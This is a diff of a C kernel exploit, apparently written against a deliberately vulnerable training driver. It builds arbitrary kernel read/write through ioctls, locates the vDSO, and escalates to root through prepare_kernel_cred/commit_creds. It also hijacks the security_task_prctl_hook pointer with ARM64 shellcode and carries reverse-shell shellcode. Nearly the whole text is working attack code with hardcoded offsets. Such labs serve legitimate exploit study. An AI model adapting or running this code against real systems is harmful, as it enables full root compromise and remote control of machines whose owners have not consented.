@@ -1,31 +1,4 @@
-#define _GNU_SOURCE
-#include <sys/mman.h>
-#include <sys/wait.h>
-#include <unistd.h>
-#include <string.h>
-#include <stdlib.h>
-#include <arpa/inet.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <sched.h>
-#include <sys/ioctl.h>
-#include <sys/types.h>
-#include <stdio.h>
-#include <sys/ipc.h>
-#include <sys/msg.h>
-
-#include <sys/socket.h>
-#include <sys/syscall.h>
-#include <linux/if_packet.h>
-#include <linux/if_ether.h>
-#include <linux/if_arp.h>
-#include <linux/fb.h> 
-
-#include <sys/prctl.h>   //prctl
-#include <sys/auxv.h>    //AT_SYSINFO_EHDR
-#include "vuln_driver.h"
-
-#define BUFF_SIZE 96
+#include "selflog.h"
 
 typedef struct uaf_obj
 {
@@ -67,7 +40,8 @@ int use_after_free_msgsnd(int fd, size_t target, size_t arg)
 #define PATH "/dev/vulnerable_device"
 
 #define PAGE_SIZE 4096 
-
+#define START_ADDR 0xffff800000000000 //0xffffffff80000000
+#define END_ADDR 0xffff80000fffffff    //ffffffffffffefff
 
 static unsigned char array[10]={9,9,9,9,9,9,9,9,9,9};
 
@@ -79,40 +53,12 @@ size_t fake_cr4=0x407f0;
 
 void get_root()
 {
-	size_t sprepare_kernel_cred_addr=0xffff8000000e58f8;
-	size_t scommit_creds_addr=0xffff8000000e5320;
+	size_t sprepare_kernel_cred_addr=0xffffffc0000b3d60;
+	size_t scommit_creds_addr=0xffffffc0000b3878;
 	char* (*pkc)(int) = sprepare_kernel_cred_addr;
 	void (*cc)(char*) = scommit_creds_addr;
 	(*cc)((*pkc)(0));
 }
-struct vdso_patch {
-	unsigned char *patch;
-	unsigned char *copy;
-	size_t size;
-	void *addr;
-};
-static struct vdso_patch vdso_patch[2];
-#define START_ADDR 0xffff800000000000 //0xffffffff80000000
-#define END_ADDR 0xffff80000fffffff    //ffffffffffffefff
-
-struct init_args {
-	size_t size;
-};
-struct realloc_args{
-	int grow;
-	size_t size;
-};
-struct read_args{
-	char *buff;
-	size_t count;
-};
-struct seek_args{
-	loff_t new_pos;
-};
-struct write_args{
-	char *buff;
-	size_t count;
-};
 
 
 int read_mem(int fd, size_t addr,char *buff,int count)
@@ -142,6 +88,7 @@ int write_mem(int fd, size_t addr,char *buff,int count)
 	ret=ioctl(fd,ARBITRARY_RW_WRITE,&w_args);  // write
 	return ret;
 }
+
 int check_vdso_shellcode(char *shellcode)
 {
 	size_t addr=0;
@@ -168,16 +115,16 @@ unsigned long *p_map;
 	struct realloc_args rello_args;
 size_t kernel_base=0;
 //size_t selinux_disable_addr = 0x3607f0;   //ffffffff813607f0 T selinux_disable   - 0xffffffff81000000(vmmap) =0x3607f0
-size_t security_task_prctl_hook=0x38ce40;//c7108; //2f2310            // 0xffffffff81e9bcc0+0x18=0xffffffff81e9bcd8 - 0xffffffff81000000=0xe9bcd8
+size_t security_task_prctl_hook=0x390780;//c7108; //2f2310            // 0xffffffff81e9bcc0+0x18=0xffffffff81e9bcd8 - 0xffffffff81000000=0xe9bcd8
 size_t cap_task_prctl_hook=0x2ede38;//c7108; //2f2310
 size_t order_cmd=0xd3210;       //mov    rdi,0xffffffff81e4cf40
 size_t poweroff_work_addr=0x90c608; // ffffffff810a7590 t poweroff_work_func
-size_t prepare_kernel_cred_addr=0xe58f8;
-size_t commit_creds_addr=0xe5320;
+size_t prepare_kernel_cred_addr=0xe7f20;
+size_t commit_creds_addr=0xe7938;
 size_t set_memory_x_addr=0x95270;
 
-char shellcode[]=
-"\xfd\x7b\xbf\xa9\xe1\x53\x98\x92\x61\x01\xa0\xf2\x00\x00\x80\x52\xfd\x03\x00\x91\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xe1\xf0\x98\x92\x61\x01\xa0\xf2\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xfd\x7b\xc1\xa8\xc0\x03\x5f\xd6";
+char shellcode[]="\xfd\x7b\xbf\xa9\xfd\x03\x00\x91\xe0\x03\x1e\xaa\xe1\x1b\x90\x92\x00\x00\x80\x52\xc1\x01\xa0\xf2\x01\x00\xd0\xf2\x20\x00\x3f\xd6\xe1\xd8\x90\x92\xc1\x01\xa0\xf2\x01\x00\xd0\xf2\x20\x00\x3f\xd6\xfd\x7b\xc1\xa8\xc0\x03\x5f\xd6";
+
 char shellcodereverse[]=
 "\xc8\x18\x80\xd2\x01\xfd\x47\xd3\x20\xf8\x7f\xd3\xe2\x03\x1f\xaa"
 "\xe1\x66\x02\xd4\xe4\x03\x20\xaa\x21\xf8\x7f\xd3\x21\x82\xab\xf2"
@@ -198,7 +145,7 @@ if(fd < 0)
 printf("open fail\n"); 
 exit(1); 
 } 
-
+//ioctl(fd,INIT_KLOG,NULL);
 // 构造任意地址读写
 i_args.size=0x100;
 ioctl(fd, ARBITRARY_RW_INIT, &i_args);
@@ -217,6 +164,9 @@ for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
 		break;
 	}
 }
+
+#define START_ADDR 0xffff800000000000 //0xffffffff80000000
+#define END_ADDR 0xffff80000fffffff    //ffffffffffffefff
 
 kernel_base=result & 0xfffffffff0000000;
 //selinux_disable_addr+=kernel_base;
@@ -242,8 +192,8 @@ size_t VDSO_SIZE=0x1000;
 vdso_patch[0].patch = shellcode;
 vdso_patch[0].size = sizeof(shellcode);
 vdso_patch[0].addr = (unsigned char *)vdso_addr + VDSO_SIZE - sizeof(shellcode);
-printf("vdso shellode address:0x%p , shellcode len:0x%d",vdso_patch[0].addr,sizeof(shellcode));
-write_mem(fd,vdso_patch[0].addr, shellcode,sizeof(shellcode));
+printf("vdso shellode address:0x%p , shellcode len:0x%d \n",vdso_patch[0].addr,sizeof(shellcode));
+//write_mem(fd,vdso_patch[0].addr, shellcode,sizeof(shellcode));
 
 
 // 劫持prctl_hook去执行poweroff_work
@@ -251,7 +201,8 @@ memset(buf,'\x00',0x1000);
 *(size_t *)buf = set_memory_x_addr;
 //write_mem(fd,security_task_prctl_hook, buf, 8);
 write_mem(fd,security_task_prctl_hook, shellcode,sizeof(shellcode));
-printf("shellcode :%p",shellcode);
+//get_log(fd);
+printf("shellcode :%p \n",shellcode);
 sleep(5);
 prctl(vdso_addr,1,NULL,NULL,NULL);
 //需要fork()子线程来执行reverse_shell程序
